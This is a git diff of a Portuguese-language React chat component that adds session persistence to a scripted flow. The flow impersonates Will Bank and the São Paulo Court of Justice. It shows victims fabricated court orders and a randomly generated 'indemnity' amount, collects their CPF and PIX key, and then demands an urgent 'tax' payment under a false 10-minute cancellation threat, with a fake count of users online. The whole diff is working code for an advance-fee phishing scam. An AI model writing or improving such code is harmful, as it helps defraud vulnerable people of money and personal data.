@@ -1,4 +1,4 @@
-import { useEffect, useState, useRef, forwardRef } from "react";
+import { useEffect, useState, useRef, forwardRef, useCallback } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -11,10 +11,9 @@ import {
   DialogHeader,
   DialogTitle,
 } from "@/components/ui/dialog";
-import { saveSession, getSession } from "@/hooks/useSessionPersistence";
+import { saveSession, getSession, saveChatState, getChatState, ChatStep, ChatState } from "@/hooks/useSessionPersistence";
 import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
 
-type ChatStep = "waiting-video" | "greeting" | "quiz-mae" | "quiz-nascimento" | "identity-confirmed" | "audio-3-validation" | "waiting-confirm-validation" | "show-approval-animation" | "pix-type-selection" | "pix-cpf-input" | "pix-email-input" | "pix-confirm" | "audio-2-comprovante" | "generating-comprovante" | "envio-selection" | "sms-input" | "email-input" | "audio-1-taxas" | "taxa-info" | "processing" | "final";
 interface QuizOption {
   text: string;
   isCorrect: boolean;
@@ -26,6 +25,20 @@ interface Message {
   time: string;
   audioSrc?: string;
 }
+
+// Save points - steps that we can restore to
+const SAVE_POINTS: ChatStep[] = [
+  "greeting",
+  "identity-confirmed",
+  "audio-3-validation",
+  "pix-type-selection",
+  "pix-confirm",
+  "audio-2-comprovante",
+  "envio-selection",
+  "taxa-info",
+  "final"
+];
+
 const Chat = () => {
   const navigate = useNavigate();
   const location = useLocation();
@@ -47,6 +60,7 @@ const Chat = () => {
   const [audioListened, setAudioListened] = useState<Set<string>>(new Set());
   const [waitingForAudio, setWaitingForAudio] = useState<string | null>(null);
   const [onlineUsers] = useState(() => Math.floor(Math.random() * 36) + 12); // 12-47 pessoas
+  const [isRestoring, setIsRestoring] = useState(false);
   
   // Dialog states for popups
   const [pixDialogOpen, setPixDialogOpen] = useState(false);
@@ -62,6 +76,9 @@ const Chat = () => {
   // Try to get cpfData from location state or session
   const cpfData: CPFData | undefined = location.state?.cpfData || getSession()?.cpfData;
   const [valorBeneficio] = useState(() => {
+    // Try to restore from session first
+    const session = getSession();
+    if (session?.valorBeneficio) return session.valorBeneficio;
     // Gera ticket de R$ 21,45 a R$ 51,28 com taxa 0,71%
     const minValue = 3021.13;
     const maxValue = 7222.54;
@@ -69,9 +86,35 @@ const Chat = () => {
     return Math.round(randomValue * 100) / 100;
   });
   const [protocolo] = useState(() => {
+    // Try to restore from session first
+    const session = getSession();
+    if (session?.protocolo) return session.protocolo;
     return `202${Date.now().toString().slice(-13)}`;
   });
   const [processoNumero] = useState("0034567-89.2024.8.26.0100");
+
+  // Save chat state to session at key points
+  const persistChatState = useCallback((currentStep: ChatStep) => {
+    // Only save at save points
+    if (!SAVE_POINTS.includes(currentStep)) return;
+    
+    const chatState: ChatState = {
+      chatStep: currentStep,
+      chatAudioListened: Array.from(audioListened),
+      chatPixType: selectedPixType,
+      chatPixKey: pixKeyInput,
+      chatVideoWatched: !showVideo,
+    };
+    saveChatState(chatState);
+    console.log('[Chat] State saved at:', currentStep);
+  }, [audioListened, selectedPixType, pixKeyInput, showVideo]);
+
+  // Save state when step changes to a save point
+  useEffect(() => {
+    if (SAVE_POINTS.includes(step)) {
+      persistChatState(step);
+    }
+  }, [step, persistChatState]);
 
   const getCurrentTime = () => {
     return new Date().toLocaleTimeString('pt-BR', {
@@ -87,18 +130,300 @@ const Chat = () => {
   useEffect(() => {
     scrollToBottom();
   }, [messages, step, isTyping]);
+  
+  // Initialize chat - check for saved state or start fresh
   useEffect(() => {
     if (!cpfData) {
       navigate("/");
       return;
     }
-    // Save session
-    saveSession({ cpfData, currentStep: "/chat" });
-    // Start with video immediately
-    setShowVideo(true);
-    setStep("waiting-video");
-  }, [cpfData, navigate]);
+    
+    // Save session with valorBeneficio and protocolo
+    saveSession({ cpfData, currentStep: "/chat", valorBeneficio, protocolo });
+    
+    // Check if we have saved chat state to restore
+    const savedChatState = getChatState();
+    
+    if (savedChatState && savedChatState.chatVideoWatched && SAVE_POINTS.includes(savedChatState.chatStep)) {
+      console.log('[Chat] Restoring state from:', savedChatState.chatStep);
+      setIsRestoring(true);
+      
+      // Restore state
+      setAudioListened(new Set(savedChatState.chatAudioListened));
+      setSelectedPixType(savedChatState.chatPixType);
+      setPixKeyInput(savedChatState.chatPixKey);
+      setShowVideo(false);
+      
+      // Rebuild chat to saved step
+      rebuildChatToStep(savedChatState.chatStep);
+    } else {
+      // Start fresh - show video
+      setShowVideo(true);
+      setStep("waiting-video");
+    }
+  }, [cpfData, navigate, valorBeneficio, protocolo]);
   const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
+
+  // Rebuild chat messages to a specific step (for restoration)
+  const rebuildChatToStep = async (targetStep: ChatStep) => {
+    const fastDelay = 50; // Fast rebuild
+    
+    // Add greeting messages
+    setMessages([]);
+    
+    const addQuickBotMessage = (content: React.ReactNode) => {
+      const newMessage: Message = {
+        id: Date.now() + Math.random(),
+        type: 'bot',
+        content,
+        time: getCurrentTime()
+      };
+      setMessages(prev => [...prev, newMessage]);
+    };
+
+    const addQuickAudioMessage = (audioSrc: string) => {
+      const newMessage: Message = {
+        id: Date.now() + Math.random(),
+        type: 'audio',
+        content: null,
+        time: getCurrentTime(),
+        audioSrc
+      };
+      setMessages(prev => [...prev, newMessage]);
+    };
+    
+    // Build messages based on how far we got
+    await delay(fastDelay);
+    
+    // Always add initial messages after video
+    addQuickBotMessage(
+      <div className="space-y-2">
+        <div className="flex items-center gap-2 text-amber-500 font-bold">
+          <AlertTriangle className="w-5 h-5" />
+          <span>ATENÇÃO {cpfData?.nome?.split(' ')[0]}!</span>
+        </div>
+        <p>Você está acessando o <strong className="text-primary">SETOR DE LIQUIDAÇÃO JUDICIAL</strong> do Will Bank.</p>
+      </div>
+    );
+    
+    addQuickBotMessage(
+      <div className="space-y-2">
+        <p>Seu atendimento foi registrado no <strong>Tribunal de Justiça de São Paulo</strong> sob o:</p>
+        <div className="bg-slate-800 border border-primary/30 rounded-lg p-2 text-center">
+          <span className="text-xs text-muted-foreground">PROTOCOLO</span>
+          <p className="font-mono font-bold text-primary text-lg">{protocolo}</p>
+        </div>
+      </div>
+    );
+    
+    addQuickBotMessage(
+      <div className="space-y-3">
+        <div className="flex items-center gap-2 text-primary font-bold">
+          <Gavel className="w-5 h-5" />
+          <span>DECISÃO JUDICIAL</span>
+        </div>
+        <p className="text-sm">Identificamos que seu CPF possui <strong className="text-destructive">VALORES RETIDOS ILEGALMENTE</strong> pelo Will Bank antes do encerramento das atividades.</p>
+        <p className="text-sm">A Justiça determinou a <strong className="text-green-500">DEVOLUÇÃO IMEDIATA</strong> de:</p>
+        <div className="bg-green-50 border-2 border-green-300 rounded-xl p-4 text-center">
+          <div className="inline-flex items-center gap-2 bg-green-600 text-white text-xs font-bold px-3 py-1 rounded-full mb-2">
+            <Gavel className="w-3 h-3" />
+            PAGAMENTO AUTORIZADO PELA JUSTIÇA
+          </div>
+          <p className="text-green-700 font-black text-2xl">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</p>
+        </div>
+      </div>
+    );
+
+    if (targetStep === "greeting") {
+      setStep("greeting");
+      setIsRestoring(false);
+      return;
+    }
+
+    // Identity confirmed - quiz passed
+    addQuickBotMessage(
+      <div className="bg-green-50 border-2 border-green-300 rounded-xl p-4">
+        <div className="flex items-center gap-2 text-green-700 font-bold mb-2">
+          <Shield className="w-5 h-5" />
+          IDENTIDADE VERIFICADA - PAGAMENTO AUTORIZADO
+        </div>
+        <p className="text-sm text-green-600">Sua identidade foi confirmada junto ao <strong>Sistema Nacional de Verificação Judicial</strong>.</p>
+      </div>
+    );
+
+    // Add certificate
+    addQuickBotMessage(
+      <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-4 shadow-lg">
+        <div className="flex justify-center">
+          <img src={willbankLogo} alt="Will Bank" className="h-10" />
+        </div>
+        <h3 className="text-lg font-bold text-center bg-primary text-primary-foreground py-2 rounded-lg flex items-center justify-center gap-2">
+          <Gavel className="w-5 h-5" />
+          ORDEM DE PAGAMENTO JUDICIAL
+        </h3>
+        <div className="bg-gradient-to-r from-green-500 to-emerald-500 text-white text-center py-2 rounded-full text-sm font-bold flex items-center justify-center gap-2">
+          <CheckCircle2 className="w-4 h-4" />
+          PAGAMENTO DETERMINADO PELA JUSTIÇA
+        </div>
+      </div>
+    );
+
+    // Audio 1
+    addQuickAudioMessage("/audio/audio-1.mp3");
+
+    if (targetStep === "identity-confirmed" || targetStep === "audio-3-validation") {
+      setWaitingForAudio(audioListened.has("/audio/audio-1.mp3") ? null : "/audio/audio-1.mp3");
+      setStep("audio-3-validation");
+      setIsRestoring(false);
+      return;
+    }
+
+    // PIX type selection - after approval animation
+    addQuickBotMessage(
+      <div className="space-y-3">
+        <div className="flex items-center gap-2 text-green-600 text-lg font-bold">
+          <CheckCircle2 className="w-6 h-6" />
+          PAGAMENTO JUDICIAL LIBERADO! ✅
+        </div>
+        <p className="text-sm">O Tribunal autorizou a transferência para sua conta.</p>
+      </div>
+    );
+
+    addQuickBotMessage(
+      <span>Selecione a <strong>chave PIX cadastrada no seu nome</strong> para receber o <strong>PRIMEIRO SAQUE</strong> da sua indenização:</span>
+    );
+
+    if (targetStep === "pix-type-selection") {
+      setStep("pix-type-selection");
+      setIsRestoring(false);
+      return;
+    }
+
+    // PIX confirmed
+    if (selectedPixType) {
+      const pixKey = selectedPixType === "cpf" ? cpfData?.cpf : pixKeyInput;
+      addQuickBotMessage(
+        <div className="bg-amber-50 border-2 border-amber-400 rounded-xl p-4 space-y-3">
+          <div className="flex items-center gap-2 text-amber-700 font-bold">
+            <Gavel className="w-5 h-5" />
+            ÚLTIMA VERIFICAÇÃO DO TRIBUNAL
+          </div>
+          <div className="bg-white rounded-lg p-3 border-2 border-amber-300 space-y-1 text-foreground">
+            <p className="text-foreground"><strong>Nome:</strong> {cpfData?.nome}</p>
+            <p className="text-foreground"><strong>Chave Pix:</strong> {pixKey}</p>
+          </div>
+        </div>
+      );
+    }
+
+    if (targetStep === "pix-confirm") {
+      setStep("pix-confirm");
+      setIsRestoring(false);
+      return;
+    }
+
+    // Audio 2 - comprovante
+    addQuickBotMessage(
+      <span className="flex items-center gap-2 text-green-600">
+        <CheckCircle2 className="w-4 h-4" />
+        Chave PIX registrada com sucesso no processo!
+      </span>
+    );
+    addQuickAudioMessage("/audio/audio-2.mp3");
+
+    if (targetStep === "audio-2-comprovante") {
+      setWaitingForAudio(audioListened.has("/audio/audio-2.mp3") ? null : "/audio/audio-2.mp3");
+      setStep("audio-2-comprovante");
+      setIsRestoring(false);
+      return;
+    }
+
+    // Envio selection - after comprovante generated
+    const ipct = valorBeneficio * 0.0021;
+    const ipti = valorBeneficio * 0.0025;
+    const ipri = valorBeneficio * 0.0025;
+    const totalImposto = ipct + ipti + ipri;
+
+    addQuickBotMessage(
+      <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-4 shadow-lg text-foreground">
+        <h3 className="text-lg font-bold text-center bg-primary text-primary-foreground py-2 rounded-lg flex items-center justify-center gap-2">
+          <Gavel className="w-5 h-5" />
+          ORDEM DE PAGAMENTO - LIQUIDAÇÃO JUDICIAL
+        </h3>
+        <div className="bg-gradient-to-r from-green-500 to-emerald-500 text-white text-center py-2 rounded-full text-sm font-bold">
+          📄 DOCUMENTO OFICIAL DO TRIBUNAL
+        </div>
+      </div>
+    );
+
+    addQuickBotMessage(
+      <div className="bg-amber-50 border border-amber-300 rounded-lg p-3">
+        <p className="text-amber-800 text-sm">
+          <strong>⚖️ EXIGÊNCIA DO TRIBUNAL:</strong> Você <strong>DEVE</strong> receber uma cópia da sua Ordem de Pagamento. Escolha o método de envio:
+        </p>
+      </div>
+    );
+
+    if (targetStep === "envio-selection") {
+      setStep("envio-selection");
+      setIsRestoring(false);
+      return;
+    }
+
+    // Taxa info
+    addQuickBotMessage(
+      <div className="bg-red-600 border-2 border-red-700 rounded-xl p-4 space-y-3 text-white">
+        <div className="flex items-center gap-2 font-bold text-lg">
+          <AlertTriangle className="w-6 h-6" />
+          AVISO URGENTE DO TRIBUNAL DE JUSTIÇA
+        </div>
+        <p className="text-sm">Seu pagamento de <strong>R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</strong> está <strong>BLOQUEADO</strong> pelo Banco Central.</p>
+      </div>
+    );
+
+    if (targetStep === "taxa-info") {
+      setStep("taxa-info");
+      setIsRestoring(false);
+      return;
+    }
+
+    // Final - after tax explanation
+    addQuickBotMessage(
+      <div className="bg-card rounded-xl p-4 space-y-3 border-2 border-primary/30 text-foreground">
+        <div className="flex items-center gap-2 text-primary font-bold">
+          <Gavel className="w-5 h-5" />
+          ENTENDENDO A EXIGÊNCIA LEGAL
+        </div>
+        <div className="bg-muted rounded-lg p-3 space-y-2 text-sm">
+          <p className="font-bold text-foreground">📊 DETALHAMENTO DO IMPOSTO:</p>
+          <div className="pt-2 border-t border-border">
+            <p className="font-bold text-primary text-base">Total do Imposto: R$ {totalImposto.toFixed(2).replace('.', ',')} (0,71% do valor a receber)</p>
+          </div>
+        </div>
+      </div>
+    );
+    
+    addQuickAudioMessage("/audio/audio-3.mp3");
+    
+    addQuickBotMessage(
+      <div className="space-y-3">
+        <div className="bg-red-50 border-2 border-red-300 rounded-lg p-3 text-sm text-red-700">
+          <strong>⚠️ AVISO FINAL:</strong> Se você <strong>NÃO</strong> realizar o pagamento nos próximos <strong>10 minutos</strong>, sua Ordem de Pagamento será <strong>AUTOMATICAMENTE CANCELADA</strong>.
+        </div>
+      </div>
+    );
+
+    if (targetStep === "final") {
+      setWaitingForAudio(audioListened.has("/audio/audio-3.mp3") ? null : "/audio/audio-3.mp3");
+      setStep("final");
+      setIsRestoring(false);
+      return;
+    }
+
+    // Default fallback
+    setStep(targetStep);
+    setIsRestoring(false);
+  };
 
   // Realistic typing delays
   const getTypingDelay = (messageLength: number) => {
